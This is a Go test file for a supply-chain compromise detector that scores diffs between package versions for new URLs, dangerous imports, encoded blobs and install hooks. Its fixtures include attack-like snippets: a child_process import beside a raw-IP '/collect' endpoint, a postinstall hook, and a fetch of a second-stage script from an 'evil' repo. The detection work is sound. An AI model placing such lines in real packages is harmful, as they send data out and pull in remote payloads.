package diff //this needs to call unexported grep* functions so the package needs to be diff and NOT diff_test

//need to test the engine because otherwise there's no way to knw all of this works without waiting for an in-progress supply chain compromise
import (
	"testing"

	"github.com/grepstrength/grepwatch/alert"
	"github.com/grepstrength/grepwatch/model"
)

/* 
mirrors the grep sequence instide Analyze without the HTTP fetching and archive extration
this is fed the already extracted mock source text of two versions as plain strings
no network, no temp files, and no malware on disk
*/
func collectSignals(oldSrc, newSrc string) []model.Signal {
	var signals []model.Signal
	signals = append(signals, grepOutboundURLs(oldSrc, newSrc)...)
	signals = append(signals, grepImports(oldSrc, newSrc)...)
	signals = append(signals, grepStrings(oldSrc, newSrc)...)
	signals = append(signals, grepInstallHooks(oldSrc, newSrc)...)
	return signals
}
//headine test, driving the realistic old to new diffs through the realgreps the real alert.Score and asserts the final severity
func TestDetectionTiers(t *testing.T) {
	cases := []struct { //each row carries its inputs and the severity we expect
		name         string
		oldSrc       string
		newSrc       string
		wantSeverity model.Severity
	}{
		{
			name:         "clean change produces no finding",
			oldSrc:       `function add(a,b){ return a+b }`,
			newSrc:       `function add(a,b){ return a+b }; function mul(a,b){ return a*b }`,
			wantSeverity: model.SeverityNone, 
		},
		{

			name:         "single new domain url is low",
			oldSrc:       `const home = "https://api.example.com/v1/users"`,
			newSrc:       `const home = "https://api.example.com/v1/users"; const cdn = "https://cdn.example.com/lib.js"`,
			wantSeverity: model.SeverityLow,
		},
		{

			name:         "single dangerous import is medium",
			oldSrc:       `const x = 1`,
			newSrc:       `const x = 1; const cp = require("child_process")`,
			wantSeverity: model.SeverityMedium, 
		},
		{

			name:         "url plus import is high",
			oldSrc:       `const x = 1`,
			newSrc:       `const x = 1; const cp = require("child_process"); const cdn = "https://cdn.example.com/lib.js"`,
			wantSeverity: model.SeverityHigh, 
		},
		{

			name:   "raw ip plus import plus entropy plus hook is critical",
			oldSrc: `const x = 1`,
			newSrc: `const x = 1; ` +
				`const cp = require("child_process"); ` +
				`const c2 = "http://185.220.101.45/collect"; ` +
				`const blob = "Tf8sK2dZ9qLpXcV7bRnW4yUe6tGaHjB3oFiQ5sD8wErT2kMzN0pYxCvBuJlAdSg"; ` +
				`/* "postinstall": "node x.js" */`,
			wantSeverity: model.SeverityCritical, 
		},
	}

	for _, tc := range cases {

		t.Run(tc.name, func(t *testing.T) {
			signals := collectSignals(tc.oldSrc, tc.newSrc)

			
			finding := &model.Finding{Signals: signals} //alert.Score takes a *model.Finding, so wrap the signals in one
			got := alert.Score(finding)

			if got != tc.wantSeverity {
				t.Errorf("severity = %d, want %d (got %d signal(s))", //t.Errorf and not Fatalf to record the failure but let the loop finish
					got, tc.wantSeverity, len(signals))
			}
		})
	}
}

//hones in on the sngle most subtle property of the engine. signals on whats NEW and not what exists
func TestGrepImportsIgnoresPreexistingImport(t *testing.T) {
	oldSrc := `const cp = require("child_process")`
	newSrc := `const cp = require("child_process"); const y = 2` //nothing new

	if signals := grepImports(oldSrc, newSrc); len(signals) != 0 {
		t.Errorf("expected 0 signals for a pre-existing import, got %d", len(signals))
	}
}
//need this to differentiate between normal english text vs an encoded payload
func TestIsHighEntropy(t *testing.T) {
	cases := []struct {
		name string
		s    string
		want bool
	}{
		{"english prose is not high entropy", "the quick brown fox jumps over the lazy dog", false},
		{"dotted identifier is not high entropy", "F:Pulumirpc.ProviderHandshakeRequest.MapperTargetFieldNumber", false},
		{"base64 blob is high entropy", "Tf8sK2dZ9qLpXcV7bRnW4yUe6tGaHjB3oFiQ5sD8wErT2kMzN0pYxCvBuJlAdSg", true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := isHighEntropy(tc.s); got != tc.want {
				t.Errorf("isHighEntropy(%q) = %v, want %v", tc.s, got, tc.want)
			}
		})
	}
}

func TestGrepOutboundURLsFiltersNoise(t *testing.T) {
	old := `const x = 1`

	noise := `const x = 1
	  "repository": "https://github.com/owner/repo.git"
	  // see https://github.com/owner/repo/issues/487
	  // docs https://nodejs.org/docs/latest-v26.x/api/errors.html#class-error`
	if sigs := grepOutboundURLs(old, noise); len(sigs) != 0 {
		t.Errorf("repo/issue/doc URLs should not fire, got %d: %+v", len(sigs), sigs)
	}

	payload := `const x = 1; fetch("https://raw.githubusercontent.com/evil/repo/main/stage2.sh")`
	if sigs := grepOutboundURLs(old, payload); len(sigs) != 1 || sigs[0].Weight != 4 {
		t.Errorf("raw payload host should fire at weight 4, got %+v", sigs)
	}
}